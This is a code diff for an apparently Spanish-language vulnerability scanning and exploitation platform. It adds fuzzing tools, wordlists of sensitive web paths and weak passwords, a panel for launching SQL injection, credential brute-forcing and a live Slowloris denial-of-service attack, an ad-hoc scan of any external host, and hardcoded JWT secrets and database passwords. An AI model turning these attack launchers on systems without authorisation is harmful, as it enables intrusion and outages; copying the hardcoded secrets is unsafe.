@@ -125,6 +125,28 @@ RUN wget https://github.com/projectdiscovery/subfinder/releases/download/v2.6.6/
     && mv subfinder /usr/local/bin/ \
     && rm subfinder_2.6.6_linux_amd64.zip
 
+# 3.5 Instalar ffuf (US-3.X — endpoint fuzzing)
+RUN wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz \
+    && tar -xzf ffuf_2.1.0_linux_amd64.tar.gz \
+    && mv ffuf /usr/local/bin/ \
+    && rm -f ffuf_2.1.0_linux_amd64.tar.gz LICENSE README.md CHANGELOG.md
+
+# 3.6 Instalar WhatWeb (fingerprinting de tecnologías web)
+RUN apt-get update && apt-get install -y whatweb && rm -rf /var/lib/apt/lists/*
+
+# 3.7 Instalar testssl.sh (análisis TLS/SSL — ENS mp.com.2)
+RUN apt-get update && apt-get install -y dnsutils bsdmainutils && rm -rf /var/lib/apt/lists/* \
+    && wget https://github.com/drwetter/testssl.sh/archive/refs/tags/v3.2.3.tar.gz \
+    && tar -xzf v3.2.3.tar.gz \
+    && mv testssl.sh-3.2.3/testssl.sh /usr/local/bin/testssl.sh \
+    && chmod +x /usr/local/bin/testssl.sh \
+    && rm -rf testssl.sh-3.2.3 v3.2.3.tar.gz
+
+# 3.8 Wordlist embebida para ffuf
+RUN mkdir -p /usr/share/wordlists \
+    && printf 'admin\nlogin\nbackup\n.env\n.git/HEAD\nwp-admin\napi\napi/v1\napi/v2\nconsole\nphpmyadmin\nphpinfo.php\nconfig.php\n.htaccess\nrobots.txt\nsitemap.xml\nswagger.json\nopenapi.json\nactuator\nactuator/health\nactuator/env\nmanager/html\nserver-status\nserver-info\ntest\ndebug\nold\ntmp\nupload\nuploads\nfiles\nstatic/admin\nadmin/config\nbackup.zip\nbackup.sql\ndb.sql\nconfig.bak\nweb.config\ncrossdomain.xml\n' \
+    > /usr/share/wordlists/ffuf_web.txt
+
 # 4. Descargar plantillas de vulnerabilidades
 RUN nuclei -update-templates
 
@@ -188,6 +210,8 @@ RUN apt-get update && apt-get install -y \
     hydra \
     sqlmap \
     sshpass \
+    gobuster \
+    wget \
     iputils-ping \
     git \
     gcc \
@@ -206,7 +230,10 @@ RUN if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then \
         mkdir -p /usr/share/wordlists && \
         printf 'admin\npassword\n123456\nroot\ntoor\nletmein\nqwerty\n12345678\nadmin123\npassword1\ntest\nguest\nubuntu\nchangeme\nscanops\ntest123\n'  \
         > /usr/share/wordlists/rockyou.txt; \
-    fi
+    fi \
+    && wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt" \
+       -O /usr/share/wordlists/common.txt \
+    || echo "common.txt no descargado — usar docker cp"
 
 # Instalar NetExec desde GitHub
 RUN pip install --no-cache-dir git+https://github.com/Pennyw0rth/NetExec
@@ -272,6 +299,7 @@ WORKDIR /app
 COPY requirements.orchestrator.txt .
 RUN pip install --no-cache-dir -r requirements.orchestrator.txt
 COPY services/orchestrator /app/services/orchestrator
+COPY shared /app/shared
 EXPOSE 8009
 CMD ["uvicorn", "services.orchestrator.main:app", "--host", "0.0.0.0", "--port", "8009"]
 FILE:Dockerfile.scanner
@@ -305,6 +333,28 @@ RUN wget https://github.com/projectdiscovery/subfinder/releases/download/v2.6.6/
     && unzip subfinder_2.6.6_linux_amd64.zip \
     && mv subfinder /usr/local/bin/ \
     && rm subfinder_2.6.6_linux_amd64.zip
+
+# 3.5 Instalar ffuf (US-3.X — endpoint fuzzing)
+RUN wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz \
+    && tar -xzf ffuf_2.1.0_linux_amd64.tar.gz \
+    && mv ffuf /usr/local/bin/ \
+    && rm -f ffuf_2.1.0_linux_amd64.tar.gz LICENSE README.md CHANGELOG.md
+
+# 3.6 Instalar WhatWeb (fingerprinting de tecnologías web)
+RUN apt-get update && apt-get install -y whatweb && rm -rf /var/lib/apt/lists/*
+
+# 3.7 Instalar testssl.sh (análisis TLS/SSL — ENS mp.com.2)
+RUN apt-get update && apt-get install -y dnsutils bsdmainutils && rm -rf /var/lib/apt/lists/* \
+    && wget https://github.com/drwetter/testssl.sh/archive/refs/tags/v3.2.3.tar.gz \
+    && tar -xzf v3.2.3.tar.gz \
+    && mv testssl.sh-3.2.3/testssl.sh /usr/local/bin/testssl.sh \
+    && chmod +x /usr/local/bin/testssl.sh \
+    && rm -rf testssl.sh-3.2.3 v3.2.3.tar.gz
+
+# 3.8 Wordlist embebida para ffuf
+RUN mkdir -p /usr/share/wordlists \
+    && printf 'admin\nlogin\nbackup\n.env\n.git/HEAD\nwp-admin\napi\napi/v1\napi/v2\nconsole\nphpmyadmin\nphpinfo.php\nconfig.php\n.htaccess\nrobots.txt\nsitemap.xml\nswagger.json\nopenapi.json\nactuator\nactuator/health\nactuator/env\nmanager/html\nserver-status\nserver-info\ntest\ndebug\nold\ntmp\nupload\nuploads\nfiles\nstatic/admin\nadmin/config\nbackup.zip\nbackup.sql\ndb.sql\nconfig.bak\nweb.config\ncrossdomain.xml\n' \
+    > /usr/share/wordlists/ffuf_web.txt
 
 # 4. Descargar plantillas de vulnerabilidades
 RUN nuclei -update-templates
@@ -1361,8 +1411,11 @@ services:
       REDIS_URL: redis://scanops-main-redis:6379/0
       M4_DRY_RUN: "false"
       HYDRA_WORDLIST: "/usr/share/wordlists/rockyou.txt"
-      HYDRA_THREADS: "4"
-      HYDRA_TIMEOUT: "120"
+      HYDRA_THREADS: "2"
+      HYDRA_TIMEOUT: "600"
+      GOBUSTER_WORDLIST: "/usr/share/wordlists/common.txt"
+      GOBUSTER_THREADS: "10"
+      GOBUSTER_TIMEOUT: "300"
       UBUNTU_TEST_TARGET_IP: "10.202.15.100"
       UBUNTU_TEST_SSH_USER: "admin"
       NXC_TIMEOUT: 30
@@ -1503,7 +1556,7 @@ services:
       - "8006:8006"
     environment:
       - DATABASE_URL=postgresql://scanops:scanops@postgres:5432/scanops
-      - JWT_SECRET_KEY=scanops-secret-ens-alto-2026
+      - JWT_SECRET_KEY=${JWT_SECRET_KEY:-scanops-secret-ens-alto-2026}
       - WAZUH_API_URL=https://wazuh-manager:55000
       - WAZUH_USER=wazuh
       - WAZUH_PASSWORD=wazuh
@@ -1565,7 +1618,7 @@ services:
       - ./services/reporting_engine:/app
     environment:
       - SERVICE_NAME=M7-Reporting
-      - JWT_SECRET_KEY=scanops-secret-ens-alto-2026
+      - JWT_SECRET_KEY=${JWT_SECRET_KEY:-scanops-secret-ens-alto-2026}
       - DATABASE_URL=postgresql://scanops:scanops@scanops-postgres:5432/scanops
       - GOOGLE_DRIVE_FOLDER_ID=${GOOGLE_DRIVE_FOLDER_ID}
       - TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
@@ -1576,6 +1629,36 @@ services:
         condition: service_healthy
     networks:
       - scanops
+
+  orchestrator:
+    build:
+      context: .
+      dockerfile: Dockerfile.orchestrator
+    container_name: scanops-orchestrator
+    ports:
+      - "8009:8009"
+    environment:
+      DATABASE_URL: postgresql://scanops:scanops@postgres:5432/scanops
+      REDIS_URL: redis://scanops-main-redis:6379/0
+      JWT_SECRET_KEY: [REDACTED]
+      TELEGRAM_BOT_TOKEN: [REDACTED]
+      TELEGRAM_CHAT_ID: ${TELEGRAM_CHAT_ID:-}
+      PLATFORM_URL: ${PLATFORM_URL:-https://localhost:5173}
+      M1_URL: http://m1:8001
+      M2_URL: http://m2:8003
+      M3_URL: http://scanner-engine:8002
+      M4_URL: http://m4:8004
+      M5_URL: http://m5:8006
+      M7_URL: http://m7:8000
+      M8_URL: http://m8:8005
+    depends_on:
+      postgres:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+    networks:
+      - scanops
+    restart: unless-stopped
 
 volumes:
   pgdata:
@@ -2589,6 +2672,12 @@ uvicorn>=0.20.0
 httpx>=0.24.0
 pydantic>=2.0.0
 pydantic-settings>=2.0.0
+sqlalchemy>=2.0.0
+psycopg2-binary>=2.9.0
+python-jose[cryptography]>=3.3.0
+bcrypt>=4.0.0
+python-multipart>=0.0.6
+redis>=4.5.0
 FILE:run_migrations.sh
 #!/bin/bash
 # run_migrations.sh - Ejecuta las migraciones de Alembic dentro del contenedor
@@ -8613,7 +8702,7 @@ export function AlertsPage() {
   );
 }
 FILE:frontend\src\app\components\AssetDetailPage.tsx
-TRUNCATED:true SIZE:63033
+TRUNCATED:true SIZE:63087
 import { useState, useEffect, useCallback, useMemo, useRef } from 'react';
 import { useParams, useNavigate } from 'react-router';
 import { Sidebar } from './Sidebar';
@@ -8983,11 +9072,11 @@ export function AssetDetailPage() {
 
       // ── FASE M3: Vulnerabilidades ───────────────────────────
       setPipelinePhase('m3');
-      plog(`[M3] Lanzando Nmap + Nuclei + Nikto sobre ${asset.ip}...`);
+      plog(`[M3] Lanzando Nmap + Nuclei + Nikto + ffuf + whatweb + testssl sobre ${asset.ip}...`);
       const m3Launch = await fetch(
         `http://localhost:8002/api/v1/scan/asset/${asset.id}`,
         { method: 'POST', headers: authHeader(),
-          body: JSON.stringify({ scan_types: ['nmap','nuclei','nikto'],
+          body: JSON.stringify({ scan_types: ['nmap','nuclei','nikto','ffuf','whatweb','testssl'],
             description: `Pipeline completo: ${asset.ip}` }),
           signal: AbortSignal.timeout(15000) }
       );
@@ -9650,8 +9739,7 @@ export function AssetDetailPage() {
             <div className="flex items-center justify-between px-5 py-4 border-b border-[#1e2530]">
               <div className="flex items-center gap-3">
                 <Zap className="w-5 h-5 text-[#a78bfa]"/>
-                <div>
-                  <h3 className="text-sm font-bol
+                <
 FILE:frontend\src\app\components\AssetManagerPage.tsx
 TRUNCATED:true SIZE:86020
 import { useState, useCallback, useEffect } from 'react';
@@ -12006,11 +12094,11 @@ export function DashboardPage() {
 
         // M3
         setImmPhase('m3');
-        ilog(`[M3] Lanzando Nmap+Nuclei+Nikto sobre ${asset.ip}...`);
+        ilog(`[M3] Lanzando Nmap+Nuclei+Nikto+ffuf+whatweb+testssl sobre ${asset.ip}...`);
         try {
           const m3Launch = await fetch(`http://localhost:8002/api/v1/scan/asset/${asset.id}`,
             { method: 'POST', headers: authH(),
-              body: JSON.stringify({ scan_types: ['nmap','nuclei','nikto'],
+              body: JSON.stringify({ scan_types: ['nmap','nuclei','nikto','ffuf','whatweb','testssl'],
                 description: `Ciclo inmediato: ${asset.ip}` }),
               signal: AbortSignal.timeout(15000) });
           if (m3Launch.ok) {
@@ -12931,6 +13019,7 @@ export function ExploitationPage() {
   const [attackRunning, setAttackRunning] = useState(false);
   const [attackResult, setAttackResult] = useState<any>(null);
   const [attackLog, setAttackLog] = useState<{ ts: string; msg: string; level: string }[]>([]);
+  const [showAllFindings, setShowAllFindings] = useState(false);
   const attackLogRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
@@ -12976,6 +13065,13 @@ export function ExploitationPage() {
       attacks.push({ id: 'brute_http', label: 'Fuerza Bruta HTTP', port: portNums.includes(80) ? 80 : 443, icon: '🌐' });
     if (portNums.includes(80) || portNums.includes(443))
       attacks.push({ id: 'dos_check', label: 'DoS Vulnerability Check', port: portNums.includes(80) ? 80 : 443, icon: '⚡' });
+    if (portNums.includes(80) || portNums.includes(443))
+      attacks.push({ id: 'gobuster_dir', label: 'Enum. Directorios Web', port: portNums.includes(443) ? 443 : 80, icon: '📂' });
+    attacks.push({ id: 'gobuster_dns', label: 'Enum. Subdominios DNS', port: portNums.includes(443) ? 443 : 80, icon: '🌐' });
+    if (portNums.includes(80) || portNums.includes(443))
+      attacks.push({ id: 'sqlmap', label: 'SQL Injection (SQLMap)', port: portNums.includes(80) ? 80 : 443, icon: '🗄️' });
+    if (portNums.includes(80) || portNums.includes(443))
+      attacks.push({ id: 'dos_slowloris', label: 'DoS Real (Slowloris)', port: portNums.includes(80) ? 80 : 443, icon: '💥' });
     return attacks;
   };
 
@@ -12984,6 +13080,7 @@ export function ExploitationPage() {
     setAttackRunning(true);
     setAttackResult(null);
     setAttackLog([]);
+    setShowAllFindings(false);
     const alog = (msg: string, level = 'info') => {
       const ts = new Date().toLocaleTimeString('es-ES');
       setAttackLog(p => [...p, { ts, msg, level }]);
@@ -12992,7 +13089,11 @@ export function ExploitationPage() {
     const token = getToken();
     const attack = availableAttacks().find(a => a.id === attackType);
     alog(`[INIT] Lanzando ${attack?.label} sobre ${selectedAsset.ip}:${attack?.port}...`);
-    alog(`[INIT] Usuario: ${attackUsername} | Wordlist: demo.txt`);
+    if (attackType.startsWith('gobuster')) {
+      alog(`[INIT] Wordlist: rockyou.txt | Hilos: 10`);
+    } else {
+      alog(`[INIT] Usuario: ${attackUsername} | Wordlist: rockyou.txt`);
+    }
 
     try {
       const res = await fetch(`${M4_BASE}/api/m4/attack/manual`, {
@@ -13003,6 +13104,7 @@ export function ExploitationPage() {
         },
         body: JSON.stringify({
           target_ip: selectedAsset.ip,
+          target_host: selectedAsset.hostname || selectedAsset.ip,
           attack_type: attackType,
           username: attackUsername,
           port: attack?.port,
@@ -13015,12 +13117,61 @@ export function ExploitationPage() {
       const data = await res.json();
       setAttackResult(data);
 
-      if (data.success) {
-        alog(`[✓] ACCESO OBTENIDO`, 'success');
-        alog(`[✓]   → ${selectedAsset.ip}:${attack?.port} (${data.service?.toUpperCase()})`, 'success');
-        alog(`[✓]   → Credenciales: ${data.username}:${data.password_found}`, 'success');
-        alog(`[✓]   → Intentos: ${data.attempts} | Duración: ${data.duration}s`, 'success');
-        alog(`[★] VULNERABILIDAD CONFIRMADA — registrado en audit log`, 'error');
+      if (attackType === 'dos_check') {
+        if (data.success) {
+          alog(`[✓] SERVIDOR VULNERABLE — Responde a peticiones DoS`, 'success');
+          alog(`[✓]   → Target: ${selectedAsset.ip}:${attack?.port}`, 'success');
+          alog(`[✓]   → ${data.output_summary || 'Servidor alcanzable'}`, 'success');
+          alog(`[★] EXPOSICIÓN CONFIRMADA — registrado en audit log ENS`, 'error');
+        } else {
+          alog(`[✗] Servidor no responde`, 'warn');
+          alog(`[✗]   → Target: ${selectedAsset.ip}:${attack?.port}`, 'warn');
+          alog(`[✗]   → ${data.output_summary || 'Sin respuesta del servidor'}`, 'warn');
+        }
+      } else if (attackType === 'sqlmap') {
+        if (data.success) {
+          alog(`[✓] INYECCIÓN SQL CONFIRMADA`, 'success');
+          alog(`[✓]   → Target: ${data.target || selectedAsset.ip}`, 'success');
+          const injections: string[] = data.injections_found || [];
+          injections.slice(0, 5).forEach((line: string) => alog(`[✓]   → ${line}`, 'success'));
+          alog(`[★] VULNERABILIDAD CRÍTICA — registrado en audit log ENS`, 'error');
+        } else {
+          alog(`[✗] No se encontró inyección SQL`, 'warn');
+          alog(`[✗]   → Target: ${data.target || selectedAsset.ip}`, 'warn');
+          if (data.error) alog(`[✗]   → Error: ${data.error}`, 'warn');
+        }
+      } else if (attackType === 'dos_slowloris') {
+        if (data.server_went_down) {
+          alog(`[✓] SERVIDOR CAÍDO — DoS EXITOSO`, 'success');
+          alog(`[✓]   → Target: ${selectedAsset.ip}:${attack?.port}`, 'success');
+          alog(`[✓]   → Tiempo caído: ${data.down_duration_seconds}s de ${data.duration}s`, 'success');
+          alog(`[✓]   → Sockets abiertos: ${data.sockets_opened}`, 'success');
+          alog(`[★] ATAQUE DoS CONFIRMADO — registrado en audit log ENS`, 'error');
+        } else {
+          alog(`[✗] Servidor resistió el ataque Slowloris`, 'warn');
+          alog(`[✗]   → Duración: ${data.duration}s | Sockets: ${data.sockets_opened}`, 'warn');
+          alog(`[✗]   → ${data.output_summary}`, 'warn');
+        }
+      } else if (data.success) {
+        if (attackType.startsWith('gobuster')) {
+          alog(`[✓] ENUMERACIÓN COMPLETADA`, 'success');
+          alog(`[✓]   → Target: ${selectedAsset.ip} (${data.service?.toUpperCase()})`, 'success');
+          alog(`[✓]   → Hallazgos: ${data.findings?.length ?? 0} rutas/subdominios encontrados`, 'success');
+          if (data.findings?.length > 0) {
+            data.findings.slice(0, 10).forEach((f: string) => alog(`[✓]   → ${f}`, 'success'));
+            if (data.findings.length > 10) {
+              alog(`[▶] __SHOW_ALL_FINDINGS__:${data.findings.slice(10).join('|')}`, 'expand');
+            }
+          }
+          alog(`[✓]   → Intentos: ${data.attempts} | Duración: ${data.duration}s`, 'success');
+          alog(`[★] HALLAZGOS REGISTRADOS — audit log ENS`, 'error');
+        } else {
+          alog(`[✓] ACCESO OBTENIDO`, 'success');
+          alog(`[✓]   → ${selectedAsset.ip}:${attack?.port} (${data.service?.toUpperCase()})`, 'success');
+          alog(`[✓]   → Credenciales: ${data.username}:${data.password_found}`, 'success');
+          alog(`[✓]   → Intentos: ${data.attempts} | Duración: ${data.duration}s`, 'success');
+          alog(`[★] VULNERABILIDAD CONFIRMADA — registrado en audit log`, 'error');
+        }
       } else {
         alog(`[✗] Sin credenciales válidas encontradas`, 'warn');
         alog(`[✗]   → Intentos: ${data.attempts} | Duración: ${data.duration}s`, 'warn');
@@ -13423,7 +13574,7 @@ export function ExploitationPage() {
                     <div className="bg-[#0f1117] rounded-lg p-2.5 text-[10px] font-mono text-[#6b7280] space-y-0.5">
                       <div>Target: <span className="text-white">{selectedAsset?.ip ?? '—'}</span></div>
                       <div>Ataque: <span className="text-[#a78bfa]">{attackType || '—'}</span></div>
-                      <div>Wordlist: <span className="text-white">demo.txt</span></div>
+                      <div>Wordlist: <span className="text-white">rockyou.txt</span></div>
                     </div>
                   </div>
 
@@ -13441,9 +13592,13 @@ export function ExploitationPage() {
                     <div className={`rounded-lg border p-2.5 text-[10px] font-mono ${
                       attackType === 'dos_check' && attackResult.success
                         ? 'bg-[#f59e0b]/10 border-[#f59e0b]/30'
-                        : attackResult.success
-                          ? 'bg-[#ff3b3b]/10 border-[#ff3b3b]/30'
-                          : 'bg-[#1e2530] border-[#374151]'
+                        : attackType === 'sqlmap' && attackResult.success
+                          ? 'bg-[#a855f7]/10 border-[#a855f7]/30'
+                          : attackType === 'dos_slowloris' && attackResult.server_went_down
+                            ? 'bg-[#ff3b3b]/10 border-[#ff3b3b]/30'
+                            : attackResult.success
+                              ? 'bg-[#ff3b3b]/10 border-[#ff3b3b]/30'
+                              : 'bg-[#1e2530] border-[#374151]'
                     }`}>
                       {attackType === 'dos_check' ? (
                         attackResult.success ? (
@@ -13457,6 +13612,22 @@ export function ExploitationPage() {
                           <>
                             <div className="text-[#22c55e] font-bold mb-1">✓ Servidor no responde</div>
                             <div className="text-[#6b7280]">No alcanzable en el timeout</div>
+                          </>
+                        )
+                      ) : attackType === 'sqlmap' ? (
+                        attackResult.success ? (
+                          <>
+                            <div className="text-[#a855f7] font-bold mb-1">🗄️ INYECCIÓN SQL CONFIRMADA</div>
+                            <div className="text-white truncate">Target: {attackResult.target}</div>
+                            {(attackResult.injections_found || []).slice(0, 3).map((line: string, i: number) => (
+                              <div key={i} className="text-[#a855f7] truncate">→ {line}</div>
+                            ))}
+                            <div className="text-[#6b7280]">Duración: {attackResult.duration}s</div>
+                          </>
+                        ) : (
+                          <>
+                            <div className="text-[#22c55e] font-bold mb-1">✓ Sin inyección detectada</div>
+                            <div className="text-[#6b7280]">{attackResult.error || 'No vulnerable'} · {attackResult.duration}s</div>
                           </>
                         )
                       ) : attackResult.success ? (
@@ -13482,17 +13653,43 @@ export function ExploitationPage() {
                   ref={attackLogRef}
                   className="bg-[#0f1117] border border-[#1e2530] rounded-xl p-4 font-mono text-xs space-y-0.5 max-h-48 overflow-y-auto"
                 >
-                  {attackLog.map((l, i) => (
-                    <div key={i} className="flex gap-2">
-                      <span className="text-[#374151] shrink-0">{l.ts}</span>
-                      <span className={
-                        l.level === 'success' ? 'text-[#22c55e]' :
-                        l.level === 'error'   ? 'text-[#ff3b3b]' :
-                        l.level === 'warn'    ? 'text-[#f59e0b]' :
-                        'text-[#9ca3af]'
-                      }>{l.msg}</span>
-                    </div>
-                  ))}
+                  {attackLog.map((l, i) => {
+                    if (l.level === 'expand') {
+                      const extra = l.msg.replace('[▶] __SHOW_ALL_FINDINGS__:', '').split('|');
+                      return (
+                        <div key={i}>
+                          {showAllFindings && extra.map((f, j) => (
+                            <div key={j} className="flex gap-2">
+                              <span className="text-[#374151] shrink-0">{l.ts}</span>
+                              <span className="text-[#22c55e]">{`[✓]   → ${f}`}</span>
+                            </div>
+                          ))}
+                          <div
+                            className="flex gap-2 cursor-pointer"
+                            onClick={() => setShowAllFindings(p => !p)}
+                          >
+                            <span className="text-[#374151] shrink-0">{l.ts}</span>
+                            <span className="text-[#3b82f6] hover:text-[#60a5fa]">
+                              {showAllFindings
+                                ? `[▼] Ocultar ${extra.length} rutas`
+                                : `[▶] Ver todas (${extra.length} rutas más)`}
+                            </span>
+                          </div>
+                        </div>
+                      );
+                    }
+                    return (
+                      <div key={i} className="flex gap-2">
+                        <span className="text-[#374151] shrink-0">{l.ts}</span>
+                        <span className={
+                          l.level === 'success' ? 'text-[#22c55e]' :
+                          l.level === 'error'   ? 'text-[#ff3b3b]' :
+                          l.level === 'warn'    ? 'text-[#f59e0b]' :
+                          'text-[#9ca3af]'
+                        }>{l.msg}</span>
+                      </div>
+                    );
+                  })}
                 </div>
               )}
             </div>
@@ -14075,6 +14272,13 @@ export function ScannerPage() {
   const [taskIds, setTaskIds] = useState<Record<number, string>>({});
   const [reconData, setReconData] = useState<Record<number, any>>({});
 
+  // Ad-hoc scan state
+  const [adhocTarget, setAdhocTarget] = useState('');
+  const [adhocScanTypes, setAdhocScanTypes] = useState('nikto,nuclei,nmap,ffuf,whatweb,testssl');
+  const [adhocScanning, setAdhocScanning] = useState(false);
+  const [adhocError, setAdhocError] = useState<string | null>(null);
+  const [adhocStatus, setAdhocStatus] = useState<string | null>(null);
+
   const handleAddAsset = async () => {
     if (!newIP.trim()) return;
     setAdding(true);
@@ -14092,6 +14296,38 @@ export function ScannerPage() {
       setAddError(e instanceof Error ? e.message : 'Error al añadir activo');
     } finally {
       setAdding(false);
+    }
+  };
+
+  const handleAdhocScan = async () => {
+    const target = adhocTarget.trim();
+    if (!target) return;
+    setAdhocScanning(true);
+    setAdhocError(null);
+    setAdhocStatus('Registrando activo en M1...');
+    try {
+      // Reuse existing asset if already registered
+      let asset = assets.find(a => a.ip === target || a.hostname === target);
+      if (!asset) {
+        asset = await createAsset({
+          ip: target,
+          hostname: target,
+          tipo: 'OTRO',
+          criticidad: 'PENDIENTE_CLASIFICAR',
+          responsable: 'adhoc-scan',
+        });
+        await refetch();
+      }
+      setAdhocStatus('Lanzando escaneo en M3...');
+      const types = adhocScanTypes.split(',').map(s => s.trim()).filter(Boolean);
+      const task = await scanAsset(asset.id, types);
+      setAdhocStatus(`Escaneo lanzado — task ${task.task_id.slice(0, 8)}… (puede tardar 2-3 min)`);
+      setAdhocTarget('');
+    } catch (e) {
+      setAdhocError(e instanceof Error ? e.message : 'Error en escaneo ad-hoc');
+      setAdhocStatus(null);
+    } finally {
+      setAdhocScanning(false);
     }
   };
 
@@ -14197,6 +14433,53 @@ export function ScannerPage() {
             </div>
           )}
 
+          {/* ── Escaneo Ad-hoc ── */}
+          <div className="bg-[#1a1d27] border border-[#1e2530] rounded-lg p-4 space-y-3">
+            <div className="text-xs font-semibold text-[#9ca3af] uppercase tracking-widest">
+              Escaneo Ad-hoc — IP o Dominio externo
+            </div>
+            <div className="flex gap-3">
+              <input
+                type="text"
+                value={adhocTarget}
+                onChange={e => setAdhocTarget(e.target.value)}
+                onKeyDown={e => e.key === 'Enter' && handleAdhocScan()}
+                placeholder="82.223.9.162 o beta.unuware.com"
+                disabled={adhocScanning}
+                className="flex-1 bg-[#0f1117] border border-[#1e2530] rounded-lg px-3 py-2 text-white text-sm placeholder:text-[#6b7280] focus:outline-none focus:border-[#00d4ff] transition-colors font-mono disabled:opacity-50"
+              />
+              <select
+                value={adhocScanTypes}
+                onChange={e => setAdhocScanTypes(e.target.value)}
+                disabled={adhocScanning}
+                className="text-xs bg-[#0f1117] border border-[#1e2530] text-[#9ca3af] rounded-lg px-2 py-2 focus:outline-none focus:border-[#00d4ff] disabled:opacity-50"
+              >
+                <option value="nikto,nuclei,nmap,ffuf,whatweb,testssl">Full Web Scan (all)</option>
+                <option value="ffuf,whatweb,testssl">Web-only (ffuf+whatweb+testssl)</option>
+                <option value="nikto,nuclei,nmap">Legacy (nikto+nuclei+nmap)</option>
+                <option value="ffuf">ffuf — Endpoint Fuzzing</option>
+                <option value="whatweb">whatweb — Tech Fingerprint</option>
+                <option value="testssl">testssl — TLS/SSL Analysis</option>
+              </select>
+              <button
+                onClick={handleAdhocScan}
+                disabled={adhocScanning || !adhocTarget.trim()}
+                className="flex items-center gap-2 px-4 py-2 bg-[#00d4ff]/10 hover:bg-[#00d4ff]/20 border border-[#00d4ff]/30 text-[#00d4ff] text-sm font-medium rounded-lg transition-colors disabled:opacity-50"
+              >
+                {adhocScanning ? <Activity className="w-4 h-4 animate-pulse" /> : <Play className="w-4 h-4" />}
+                {adhocScanning ? 'Escaneando...' : 'Iniciar Análisis'}
+              </button>
+            </div>
+            {adhocError && (
+              <div className="flex items-center gap-2 text-xs text-[#ff3b3b]">
+                <AlertCircle className="w-3.5 h-3.5 shrink-0" />{adhocError}
+              </div>
+            )}
+            {adhocStatus && !adhocError && (
+              <div className="text-xs text-[#22c55e] font-mono">{adhocStatus}</div>
+            )}
+          </div>
+
           {error && (
             <div className="flex items-center gap-2 bg-[#f59e0b]/10 border border-[#f59e0b]/30 rounded-lg px-3 py-2 text-sm text-[#f59e0b]">
               <AlertCircle className="w-4 h-4 shrink-0" />M1 no disponible — {error}
@@ -14254,9 +14537,13 @@ export function ScannerPage() {
                         <option value="nikto">Nikto</option>
                         <option value="nuclei">Nuclei</option>
                         <option value="nmap">Nmap</option>
+                        <option value="ffuf">ffuf — Endpoint Fuzzing</option>
+                        <option value="whatweb">whatweb — Tech Fingerprint</option>
+                        <option value="testssl">testssl — TLS/SSL Analysis</option>
                         <option value="nikto,nuclei">Nikto + Nuclei</option>
                         <option value="nikto,nmap">Nikto + Nmap</option>
-                        <option value="nikto,nuclei,nmap">Todo</option>
+                        <option value="nikto,nuclei,nmap">Todo (legacy)</option>
+                        <option value="nuclei,nikto,nmap,ffuf,whatweb,testssl">Full Web Scan (all)</option>
                       </select>
                       <button
                         onClick={() => handleScan(asset)}
@@ -22104,7 +22391,7 @@ export function usePendingApprovals(pollIntervalMs = 60000): UsePendingApprovals
       console.log('[M4] Fetching approvals, token present:', !!token);
       const response = await fetch(ENDPOINTS.pendingApprovals, {
         headers: token ? { 'Authorization': `Bearer ${token}` } : {},
-        signal: AbortSignal.timeout(8000),
+        signal: AbortSignal.timeout(30000),
       });
       console.log('[M4] Response status:', response.status);
       if (!response.ok) {
@@ -22122,8 +22409,10 @@ export function usePendingApprovals(pollIntervalMs = 60000): UsePendingApprovals
       setTotal(data.total ?? 0);
       setError(null);
       setIsMock(false);
-    } catch (e) {
-      console.error('[M4] Fetch failed:', e);
+    } catch (e: unknown) {
+      if (e instanceof Error && e.name !== 'AbortError' && e.name !== 'TimeoutError') {
+        console.error('[M4] Fetch failed:', e);
+      }
       setError('M4 no disponible — mostrando datos de demostración');
       setApprovals(MOCK_APPROVALS);
       setTotal(MOCK_APPROVALS.length);
@@ -22376,11 +22665,38 @@ export function UnifiedScannerLayout() {
         if (m2Data.reconnaissance?.os_information?.detected_family)
           log(`[M2] OS detectado: ${m2Data.reconnaissance.os_information.detected_family}`);
 
-        setAdhocPhase('M3');
-        log(`[M3] Lanzando Nuclei + Nikto + Nmap sobre ${cleanTarget}...`);
-        const m3Launch = await fetch(`http://localhost:8002/api/v1/scan/asset/10`, {
+        // Register asset in M1 (or reuse if already exists)
+        setAdhocPhase('M1');
+        log(`[M1] Registrando activo ${cleanTarget} en inventario...`);
+        let assetId;
+        const m1Register = await fetch('http://localhost:8001/api/v1/assets', {
           method: 'POST', headers: authH(),
-          body: JSON.stringify({ scan_types: ['nmap', 'nuclei', 'nikto'], description: `Ad-hoc IP: ${cleanTarget}` }),
+          body: JSON.stringify({ ip: cleanTarget, hostname: cleanTarget, tipo: 'OTRO', criticidad: 'PENDIENTE_CLASIFICAR', responsable: 'adhoc-scan' }),
+          signal: AbortSignal.timeout(15000),
+        });
+        if (m1Register.ok) {
+          const m1Asset = await m1Register.json();
+          assetId = m1Asset.id;
+          log(`[M1] ✓ Activo registrado — asset_id=${assetId}`);
+        } else if (m1Register.status === 409) {
+          // Asset already exists — fetch it by IP to get its id
+          const m1Find = await fetch(`http://localhost:8001/api/v1/assets?search=${encodeURIComponent(cleanTarget)}&page_size=1`,
+            { headers: authH(), signal: AbortSignal.timeout(10000) });
+          if (!m1Find.ok) throw new Error(`M1 lookup HTTP ${m1Find.status}`);
+          const m1List = await m1Find.json();
+          const existing = (m1List.items ?? [])[0];
+          if (!existing) throw new Error(`M1: activo no encontrado para ${cleanTarget}`);
+          assetId = existing.id;
+          log(`[M1] Activo ya registrado — asset_id=${assetId}`);
+        } else {
+          throw new Error(`M1 HTTP ${m1Register.status}`);
+        }
+
+        setAdhocPhase('M3');
+        log(`[M3] Lanzando Nmap + Nuclei + Nikto + ffuf + whatweb + testssl sobre ${cleanTarget}...`);
+        const m3Launch = await fetch(`http://localhost:8002/api/v1/scan/asset/${assetId}`, {
+          method: 'POST', headers: authH(),
+          body: JSON.stringify({ scan_types: ['nmap', 'nuclei', 'nikto', 'ffuf', 'whatweb', 'testssl'], description: `Ad-hoc IP: ${cleanTarget}` }),
           signal: AbortSignal.timeout(15000),
         });
         if (!m3Launch.ok) throw new Error(`M3 HTTP ${m3Launch.status}`);
@@ -22389,7 +22705,7 @@ export function UnifiedScannerLayout() {
         await new Promise(r => setTimeout(r, 15000));
